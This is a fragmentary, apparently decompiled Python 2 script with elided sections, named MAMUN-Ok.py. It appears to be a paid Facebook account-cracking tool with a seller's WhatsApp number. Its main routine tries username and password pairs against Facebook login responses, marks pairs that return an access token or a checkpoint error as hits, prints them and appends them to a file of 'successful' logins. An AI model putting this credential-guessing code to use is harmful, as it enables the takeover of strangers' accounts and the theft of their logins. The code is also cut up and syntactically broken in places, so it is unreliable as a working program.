...
# Embedded file name: /storage/emulated/0/MAMUN-Ok.py
...
os.system('clear')
psb('\x1b[1;32mThis Command Paid ...............')
...
def menu():
    ...
    print '\x1b[1;91mWHATSAPP  : +8801759916221
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[TONU-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[TONU-OK]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login JUST NOW]\x1b[0m \n'
